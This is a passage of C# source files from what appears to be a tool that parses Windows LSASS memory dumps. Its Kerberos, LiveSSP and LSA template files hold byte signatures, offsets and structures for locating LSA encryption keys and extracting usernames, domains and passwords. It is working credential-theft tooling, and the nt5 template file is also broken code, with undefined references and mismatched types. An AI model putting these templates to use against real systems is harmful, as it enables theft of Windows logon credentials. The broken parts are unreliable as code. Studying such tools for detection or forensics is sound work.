                    template.LogonSessionTypeSize = Marshal.SizeOf(typeof(KIWI_KERBEROS_LOGON_SESSION_10_1607));
                    template.PrimaryCredentialType = typeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607);
                }
                else
                {
                    throw new Exception(String.Format("Could not identify template! Architecture: %s sysinfo.BuildNumber: %s", sysinfo.ProcessorArchitecture, sysinfo.BuildNumber));
                }
                template.SessionCredentialOffset = StructFieldOffset(template.LogonSessionType, "credentials");
                template.SessionUserNameOffset = StructFieldOffset(template.PrimaryCredentialType, "UserName");
                template.SessionDomainOffset = StructFieldOffset(template.PrimaryCredentialType, "Domain");
                template.SessionPasswordOffset = StructFieldOffset(template.PrimaryCredentialType, "Password");
            }
            else if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                if ((int)SystemInfo.WindowsMinBuild.WIN_XP <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_2K3)
                {
                    template.signature = new byte[] { 0x8B, 0x7D, 0x08, 0x8B, 0x17, 0x39, 0x50 };
                    template.first_entry_offset = -8;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_2K3 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.signature = new byte[] { 0x8B, 0x7D, 0x08, 0x8B, 0x17, 0x39, 0x50 };
                    template.first_entry_offset = -8;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_7)
                {
                    template.signature = new byte[] { 0x53, 0x8b, 0x18, 0x50, 0x56 };
                    template.first_entry_offset = -11;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_7 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
                {
                    template.signature = new byte[] { 0x53, 0x8b, 0x18, 0x50, 0x56 };
                    template.first_entry_offset = -11;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_8 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_BLUE)
                {
                    template.signature = new byte[] { 0x57, 0x8b, 0x38, 0x50, 0x68 };
                    template.first_entry_offset = -14;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_BLUE <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    template.signature = new byte[] { 0x56, 0x8b, 0x30, 0x50, 0x57 };
                    template.first_entry_offset = -15;
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1507 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1511)
                {
                    //###DOUBLE CHECK THE STRUCTURES BELOW LINE!!!!
                    //### kerbHelper[N] -> KerberosReferences... {-15,7}}, here N= 7
                    template.signature = new byte[] { 0x56, 0x8b, 0x30, 0x50, 0x57 };
                    template.first_entry_offset = -15;
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1511 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1903)
                {
                    template.signature = new byte[] { 0x56, 0x8b, 0x30, 0x50, 0x57 };
                    template.first_entry_offset = -15;
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1903 <= sysinfo.BuildNumber)
                {
                    template.signature = new byte[] { 0x56, 0x8b, 0x30, 0x50, 0x53 };
                    template.first_entry_offset = -15;
                }
            }
            else
            {
                throw new Exception($"Unknown architecture! {sysinfo.ProcessorArchitecture}");
            }
            return template;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RTL_AVL_TABLE
        {
            public RTL_BALANCED_LINKS BalancedRoot;
            public long OrderedPointer;
            public uint WhichOrderedElement;
            public uint NumberGenericTableElements;
            public uint DepthOfTree;
            public long RestartKey;
            public uint DeleteCount;
            public long CompareRoutine;
            public long AllocateRoutine;
            public long FreeRoutine;
            public long TableContext;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RTL_BALANCED_LINKS
        {
            public long Parent;
            public long LeftChild;
            public long RightChild;
            public byte Balance;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
            public byte[] Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_KERBEROS_10_PRIMARY_CREDENTIAL
        {
            private readonly UNICODE_STRING UserName;
            private readonly UNICODE_STRING Domain;
            private readonly IntPtr unk0;
            private readonly UNICODE_STRING Password;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_KERBEROS_LOGON_SESSION_10
        {
            private readonly uint UsageCount;
            private readonly LIST_ENTRY unk0;
            private readonly IntPtr unk1;
            private readonly uint unk1b;
            private readonly FILETIME unk2;
            private readonly IntPtr unk4;
            private readonly IntPtr unk5;
            private readonly IntPtr unk6;
            private readonly LUID LocallyUniqueIdentifier;
            private readonly FILETIME unk7;
            private readonly IntPtr unk8;
            private readonly uint unk8b;
            private readonly FILETIME unk9;
            private readonly IntPtr unk11;
            private readonly IntPtr unk12;
            private readonly IntPtr unk13;
            private readonly KIWI_KERBEROS_10_PRIMARY_CREDENTIAL credentials;
            private readonly uint unk14;
            private readonly uint unk15;
            private readonly uint unk16;
            private readonly uint unk17;
            private readonly IntPtr unk19;
            private readonly IntPtr unk20;
            private readonly IntPtr unk21;
            private readonly IntPtr unk22;
            private readonly IntPtr unk23;
            private readonly IntPtr unk24;
            private readonly IntPtr unk25;
            private readonly IntPtr pKeyList;
            private readonly IntPtr unk26;
            private readonly LIST_ENTRY Tickets_1;
            private readonly FILETIME unk27;
            private readonly LIST_ENTRY Tickets_2;
            private readonly FILETIME unk28;
            private readonly LIST_ENTRY Tickets_3;
            private readonly FILETIME unk29;
            private readonly IntPtr SmartcardInfos;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO
        {
            public uint StructSize;
            public IntPtr isoBlob;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607
        {
            [FieldOffset(0)] public UNICODE_STRING UserName;

            [FieldOffset(16)] public UNICODE_STRING Domain;

            [FieldOffset(32)] public IntPtr unkFunction;

            [FieldOffset(40)] public uint type;
            [FieldOffset(48)] public UNICODE_STRING Password;

            [FieldOffset(48)] public KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO IsoPassword;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_KERBEROS_LOGON_SESSION_10_1607
        {
            public uint UsageCount;
            public LIST_ENTRY unk0;
            public IntPtr unk1;
            public uint unk1b;
            public FILETIME unk2;
            public IntPtr unk4;
            public IntPtr unk5;
            public IntPtr unk6;
            public LUID LocallyUniqueIdentifier;
            public FILETIME unk7;
            public IntPtr unk8;
            public uint unk8b;
            public FILETIME unk9;
            public IntPtr unk11;
            public IntPtr unk12;
            public IntPtr unk13;
            public KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607 credentials;
            public uint unk14;
            public uint unk15;
            public uint unk16;
            public uint unk17;
            public IntPtr unk18;
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public IntPtr unk22;
            public IntPtr unk23;
            public IntPtr unk24;
            public IntPtr unk25;
            public IntPtr pKeyList;
            public IntPtr unk26;
            public LIST_ENTRY Tickets_1;
            public FILETIME unk27;
            public LIST_ENTRY Tickets_2;
            public FILETIME unk28;
            public LIST_ENTRY Tickets_3;
            public FILETIME unk29;
            public IntPtr SmartcardInfos;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_HASHPASSWORD_6
        {
            private readonly UNICODE_STRING salt;
            private readonly IntPtr stringToKey;
            private readonly KERB_HASHPASSWORD_GENERIC generic;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_HASHPASSWORD_6_1607
        {
            private readonly UNICODE_STRING salt;
            private readonly IntPtr stringToKey;
            private readonly IntPtr unk0;
            private readonly KERB_HASHPASSWORD_GENERIC generic;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_HASHPASSWORD_GENERIC
        {
            public uint Type;
            public UIntPtr Size;
            public IntPtr Checksump;
        }
    }
}
```

`Templates/livessp_templates.cs`:

```cs
using Minidump.Streams;
using System;
using static Minidump.Helpers;

namespace Minidump.Templates
{
    public static class livessp
    {
        public struct LiveSspTemplate
        {
            public byte[] signature;
            public long first_entry_offset;
        }

        public static LiveSspTemplate get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            var template = new LiveSspTemplate();
            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                template.signature = new byte[] { 0x74, 0x25, 0x8b };
                template.first_entry_offset = -7;
            }
            else if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                template.signature = new byte[] { 0x8b, 0x16, 0x39, 0x51, 0x24, 0x75, 0x08 };
                template.first_entry_offset = -8;
            }
            else
            {
                throw new Exception($"Unknown architecture! {sysinfo.ProcessorArchitecture}");
            }

            return template;
        }
    }

    public struct KIWI_LIVESSP_PRIMARY_CREDENTIAL
    {
        public ulong isSupp;
        public ulong unk0;
        public KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
    }

    public struct KIWI_LIVESSP_LIST_ENTRY
    {
        public long Flink;
        public long Blink;
        public IntPtr unk0;
        public IntPtr unk1;
        public IntPtr unk2;
        public IntPtr unk3;
        public int unk4;
        public int unk5;
        public IntPtr unk6;
        public LUID LocallyUniqueIdentifier;
        public UNICODE_STRING UserName;
        public IntPtr unk7;
        public KIWI_LIVESSP_PRIMARY_CREDENTIAL suppCreds;
    }
}
```

`Templates/lsa_template_nt5.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Minidump;
using Minidump.Streams;

namespace Minidump.Templates
{
    public class lsaTemplate_NT5
    {
        public struct LsaTemplate_NT5
        {
            public byte[] signature;
            public uint feedback;
            public uint randomkey_ptr;
            public uint DESXKey_ptr;
            public uint key_struct;
            public string nt_major;
        }

        public static void get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            var template = new LsaTemplate_NT5();
            template.nt_major = "6";

            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                if (sysinfo.BuildNumber <= (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    return Templates["nt5"]["x86"]["1"];
                }
                else
                {
                    throw new Exception("NT 6 is in another castle!");
                }
            }
            else if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                if (sysinfo.BuildNumber <= (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    return Templates["nt5"]["x64"]["1"];
                }
                else
                {
                    throw new Exception("NT 6 is in another castle!");
                }
            }
        }
    }

    public class SYMCRYPT_NT5_DES_EXPANDED_KEY
    {
        public List<object> roundKey;

        public SYMCRYPT_NT5_DES_EXPANDED_KEY(object reader)
        {
            roundKey = new List<object>();
            foreach (var _ in Enumerable.Range(0, 16))
            {
                var r = Helpers.ReadUInt16(fileBinaryReader);
                var l = Helpers.ReadUInt16(fileBinaryReader);
                roundKey.Add(new List<object>
                {
                    r,
                    l
                });
            }
        }
    }

    public class SYMCRYPT_NT5_DESX_EXPANDED_KEY
    {
        public SYMCRYPT_NT5_DES_EXPANDED_KEY desKey;

        public object inputWhitening;

        public object outputWhitening;

        public SYMCRYPT_NT5_DESX_EXPANDED_KEY(object reader)
        {
            inputWhitening = reader.read(8);
            outputWhitening = reader.read(8);
            desKey = new SYMCRYPT_NT5_DES_EXPANDED_KEY(reader);
        }
    }

    public class PSYMCRYPT_NT5_DESX_EXPANDED_KEY
    {
        public PSYMCRYPT_NT5_DESX_EXPANDED_KEY(object reader)
            : base(SYMCRYPT_NT5_DESX_EXPANDED_KEY)
        {
        }
    }

    public class LSA_x64_nt5_1
    {
        public string arch;

        public int desx_key_ptr_offset;

        public int feedback_ptr_offset;

        public PSYMCRYPT_NT5_DESX_EXPANDED_KEY key_struct_ptr;

        public string nt_major;

        public int old_feedback_offset;

        public int randomkey_ptr_offset;

        public string signature;

        public LSA_x64_nt5_1()
        {
            arch = "x64";
            signature = new byte[] {0x33, 0xdb, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3};
            nt_major = "5";
            feedback_ptr_offset = -67;
            randomkey_ptr_offset = -17;
            desx_key_ptr_offset = -35;
            old_feedback_offset = 29;
            key_struct_ptr = PSYMCRYPT_NT5_DESX_EXPANDED_KEY;
        }
    }

    public class LSA_x86_nt5_1
    {
        public string arch;

        public int desx_key_ptr_offset;

        public int feedback_ptr_offset;

        public PSYMCRYPT_NT5_DESX_EXPANDED_KEY key_struct_ptr;

        public string nt_major;

        public int old_feedback_offset;

        public int randomkey_ptr_offset;

        public string signature;

        public LSA_x86_nt5_1()
        {
            arch = "x86";
            nt_major = "5";
            signature = new byte[] {0x05, 0x90, 0x00, 0x00, 0x00, 0x6a, 0x18, 0x50, 0xa3};
            feedback_ptr_offset = 25;
            randomkey_ptr_offset = 9;
            desx_key_ptr_offset = -4;
            old_feedback_offset = 29;
            key_struct_ptr = PSYMCRYPT_NT5_DESX_EXPANDED_KEY;
        }
    }

}
```

`Templates/lsa_template_nt6.cs`:

```cs
using Minidump.Streams;
using System;
using System.Runtime.InteropServices;

namespace Minidump.Templates
{
    public class lsaTemplate_NT6
    {
        public struct LsaTemplate_NT6
        {
            public LSADecyptorKeyPattern key_pattern;
            public object key_handle_struct;
            public object key_struct;
            public string nt_major;
        }

        public static LsaTemplate_NT6 get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            var template = new LsaTemplate_NT6();
            template.nt_major = "6";
            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                if (sysinfo.BuildNumber <= (int)SystemInfo.WindowsMinBuild.WIN_XP)
                {
                    throw new Exception("Maybe implemented later");
                }
                else if (sysinfo.BuildNumber <= (int)SystemInfo.WindowsMinBuild.WIN_2K3)
                {
                    template.nt_major = "5";
                    //template = templates["nt5"]["x86"]["1"];
                    template.key_pattern = new LSA_x86_1().key_pattern;
                    template.key_handle_struct = new LSA_x86_1().key_handle_struct;
                    template.key_struct = new LSA_x86_1().key_struct;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_7)
                {
                    //1
                    //template = templates["nt6"]["x86"]["1"];
                    template.key_pattern = new LSA_x86_1().key_pattern;
                    template.key_handle_struct = new LSA_x86_1().key_handle_struct;
                    template.key_struct = new LSA_x86_1().key_struct;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_7 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
                {
                    //2
                    //template = templates["nt6"]["x86"]["2"];
                    template.key_pattern = new LSA_x86_2().key_pattern;
                    template.key_handle_struct = new LSA_x86_2().key_handle_struct;
                    template.key_struct = new LSA_x86_2().key_struct;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_8 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
                {
                    //3
                    //template = templates["nt6"]["x86"]["3"];
                    template.key_pattern = new LSA_x86_3().key_pattern;
                    template.key_handle_struct = new LSA_x86_3().key_handle_struct;
                    template.key_struct = new LSA_x86_3().key_struct;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_BLUE <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_10)
                {
                    //4
                    //template = templates["nt6"]["x86"]["4"];
                    template.key_pattern = new LSA_x86_4().key_pattern;
                    template.key_handle_struct = new LSA_x86_4().key_handle_struct;
                    template.key_struct = new LSA_x86_4().key_struct;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_10 <= sysinfo.BuildNumber && sysinfo.BuildNumber <= (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    //5
                    //template = templates["nt6"]["x86"]["5"];
                    template.key_pattern = new LSA_x86_5().key_pattern;
                    template.key_handle_struct = new LSA_x86_5().key_handle_struct;
                    template.key_struct = new LSA_x86_5().key_struct;
                }
                else if (sysinfo.BuildNumber > (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    //6
                    //template = templates["nt6"]["x86"]["6"];
                    template.key_pattern = new LSA_x86_6().key_pattern;
                    template.key_handle_struct = new LSA_x86_6().key_handle_struct;
                    template.key_struct = new LSA_x86_6().key_struct;
                }
            }
            else if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                if (sysinfo.BuildNumber <= (int)SystemInfo.WindowsMinBuild.WIN_XP)
                {
                    throw new Exception("Maybe implemented later");
                }
                else if (sysinfo.BuildNumber <= (int)SystemInfo.WindowsMinBuild.WIN_2K3)
                {
                    throw new Exception("Maybe implemented later");
                }
                else if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_7)
                {
                    //vista
                    //1
                    //template = templates["nt6"]["x64"]["1"];
                    template.key_pattern = new LSA_x64_1().key_pattern;
                    template.key_handle_struct = new LSA_x64_1().key_handle_struct;
                    template.key_struct = new LSA_x64_1().key_struct;
                }
                else if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
                {
                    //win 7
                    //2
                    //template = templates["nt6"]["x64"]["2"];
                    template.key_pattern = new LSA_x64_2().key_pattern;
                    template.key_handle_struct = new LSA_x64_2().key_handle_struct;
                    template.key_struct = new LSA_x64_2().key_struct;
                }
                else if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_10)
                {
                    //win 8 and blue
                    //3
                    if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
                    {
                        //template = templates["nt6"]["x64"]["3"];
                        template.key_pattern = new LSA_x64_3().key_pattern;
                        template.key_handle_struct = new LSA_x64_3().key_handle_struct;
                        template.key_struct = new LSA_x64_3().key_struct;
                        //win8
                        //3
                    }
                    else
                    {
                        //template = templates["nt6"]["x64"]["4"];
                        template.key_pattern = new LSA_x64_4().key_pattern;
                        template.key_handle_struct = new LSA_x64_4().key_handle_struct;
                        template.key_struct = new LSA_x64_4().key_struct;
                        //4
                        //win blue
                    }
                }
                else if (sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1809)
                {
                    //template = templates["nt6"]["x64"]["5"];
                    template.key_pattern = new LSA_x64_5().key_pattern;
                    template.key_handle_struct = new LSA_x64_5().key_handle_struct;
                    template.key_struct = new LSA_x64_5().key_struct;
                    //5
                }
                else
                {
                    //template = templates["nt6"]["x64"]["6"];
                    template.key_pattern = new LSA_x64_6().key_pattern;
                    template.key_handle_struct = new LSA_x64_6().key_handle_struct;
                    template.key_struct = new LSA_x64_6().key_struct;
                    //1809
                    //6
                }
            }
            else
            {
                throw new Exception($"Unknown architecture! {sysinfo.ProcessorArchitecture}");
            }

            return template;
        }
    }

    public struct LSADecyptorKeyPattern
    {
        public byte[] signature;
        public int offset_to_IV_ptr;
        public int IV_length;
        public int offset_to_AES_key_ptr;
        public int offset_to_DES_key_ptr;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_HARD_KEY
    {
        public int cbSecret;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 60)]
        public byte[] data;
    }

    public struct KIWI_BCRYPT_KEY
    {
        public ulong size;
        public ulong tag;
        public ulong type;
        public ulong unk0;
        public ulong unk1;
        public ulong unk2;
        public KIWI_HARD_KEY hardkey;
    }

    public struct KIWI_BCRYPT_KEY8
    {
        public ulong size;
        public ulong tag;
        public ulong type;
        public ulong unk0;
        public ulong unk1;
        public ulong unk2;
        public ulong unk3;
        public ulong reader;

        //public PVOID unk4;
        public KIWI_HARD_KEY hardkey;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_BCRYPT_KEY81
    {
        private readonly int size;
        private readonly int tag;
        private readonly int type;
        private readonly int unk0;
        private readonly int unk1;
        private readonly int unk2;
        private readonly int unk3;
        private readonly int unk4;
        private readonly long unk5;
        private readonly int unk6;
        private readonly int unk7;
        private readonly int unk8;
        private readonly int unk9;
        public KIWI_HARD_KEY hardkey;
    }

    public class PKIWI_BCRYPT_KEY
    {
        public PKIWI_BCRYPT_KEY(object reader)
        {
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_BCRYPT_HANDLE_KEY
    {
        public int size;
        public int tag;
        public int hAlgorithm;
        public long key;
        public int unk0;
    }

    public class LSA_x64_1
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;

        public LSADecyptorKeyPattern key_pattern;

        public KIWI_BCRYPT_KEY key_struct;

        public LSA_x64_1()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 63;
            key_pattern.offset_to_DES_key_ptr = -69;
            key_pattern.offset_to_AES_key_ptr = 25;
            key_struct = new KIWI_BCRYPT_KEY();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }

    public class LSA_x64_2
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;

        public LSADecyptorKeyPattern key_pattern;

        public KIWI_BCRYPT_KEY key_struct;

        public LSA_x64_2()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 59;
            key_pattern.offset_to_DES_key_ptr = -61;
            key_pattern.offset_to_AES_key_ptr = 25;
            key_struct = new KIWI_BCRYPT_KEY();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }

    public class LSA_x64_3
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;

        public LSADecyptorKeyPattern key_pattern;

        public KIWI_BCRYPT_KEY8 key_struct;

        public LSA_x64_3()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 62;
            key_pattern.offset_to_DES_key_ptr = -70;
            key_pattern.offset_to_AES_key_ptr = 23;
            key_struct = new KIWI_BCRYPT_KEY8();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }

    public class LSA_x64_4
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;

        public LSADecyptorKeyPattern key_pattern;

        public KIWI_BCRYPT_KEY81 key_struct;

        public LSA_x64_4()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 62;
            key_pattern.offset_to_DES_key_ptr = -70;
            key_pattern.offset_to_AES_key_ptr = 23;
            key_struct = new KIWI_BCRYPT_KEY81();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }

    public class LSA_x64_5
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;

        public LSADecyptorKeyPattern key_pattern;

        public KIWI_BCRYPT_KEY81 key_struct;

        public LSA_x64_5()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 61;
            key_pattern.offset_to_DES_key_ptr = -73;
            key_pattern.offset_to_AES_key_ptr = 16;
            key_struct = new KIWI_BCRYPT_KEY81();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }

    public class LSA_x64_6
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;
        public LSADecyptorKeyPattern key_pattern;
        public KIWI_BCRYPT_KEY81 key_struct;

        public LSA_x64_6()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 67;
            key_pattern.offset_to_DES_key_ptr = -89;
            key_pattern.offset_to_AES_key_ptr = 16;
            key_struct = new KIWI_BCRYPT_KEY81();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }

    public class LSA_x86_1
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;

        public LSADecyptorKeyPattern key_pattern;

        public KIWI_BCRYPT_KEY key_struct;

        public LSA_x86_1()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x6a, 0x02, 0x6a, 0x10, 0x68 };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 5;
            key_pattern.offset_to_DES_key_ptr = -76;
            key_pattern.offset_to_AES_key_ptr = -21;
            key_struct = new KIWI_BCRYPT_KEY();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }

    public class LSA_x86_2
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;

        public LSADecyptorKeyPattern key_pattern;

        public KIWI_BCRYPT_KEY key_struct;

        public LSA_x86_2()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x6a, 0x02, 0x6a, 0x10, 0x68 };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 5;
            key_pattern.offset_to_DES_key_ptr = -76;
            key_pattern.offset_to_AES_key_ptr = -21;
            key_struct = new KIWI_BCRYPT_KEY();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }

    public class LSA_x86_3
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;

        public LSADecyptorKeyPattern key_pattern;

        public KIWI_BCRYPT_KEY8 key_struct;

        public LSA_x86_3()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x6a, 0x02, 0x6a, 0x10, 0x68 };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 5;
            key_pattern.offset_to_DES_key_ptr = -69;
            key_pattern.offset_to_AES_key_ptr = -18;
            key_struct = new KIWI_BCRYPT_KEY8();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }

    public class LSA_x86_4
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;

        public LSADecyptorKeyPattern key_pattern;

        public KIWI_BCRYPT_KEY81 key_struct;

        public LSA_x86_4()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x6a, 0x02, 0x6a, 0x10, 0x68 };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 5;
            key_pattern.offset_to_DES_key_ptr = -69;
            key_pattern.offset_to_AES_key_ptr = -18;
            key_struct = new KIWI_BCRYPT_KEY81();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }

    public class LSA_x86_5
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;

        public LSADecyptorKeyPattern key_pattern;

        public KIWI_BCRYPT_KEY81 key_struct;

        public LSA_x86_5()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x6a, 0x02, 0x6a, 0x10, 0x68 };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 5;
            key_pattern.offset_to_DES_key_ptr = -79;
            key_pattern.offset_to_AES_key_ptr = -22;
            key_struct = new KIWI_BCRYPT_KEY81();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }

    public class LSA_x86_6
    {
        public KIWI_BCRYPT_HANDLE_KEY key_handle_struct;

        public LSADecyptorKeyPattern key_pattern;

        public KIWI_BCRYPT_KEY81 key_struct;

        public LSA_x86_6()
        {
            key_pattern = new LSADecyptorKeyPattern();
            key_pattern.signature = new byte[] { 0x6a, 0x02, 0x6a, 0x10, 0x68 };
            key_pattern.IV_length = 16;
            key_pattern.offset_to_IV_ptr = 5;
            key_pattern.offset_to_DES_key_ptr = -79;
            key_pattern.offset_to_AES_key_ptr = -22;
            key_struct = new KIWI_BCRYPT_KEY81();
            key_handle_struct = new KIWI_BCRYPT_HANDLE_KEY();
        }
    }
}
```

`Templates/lsa_templates.cs`:

```cs
using Minidump.Streams;
using System;

namespace Minidump.Templates
{
    public class lsaTemplate
    {
        public static object get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                throw new Exception($"X86 not yet supported");
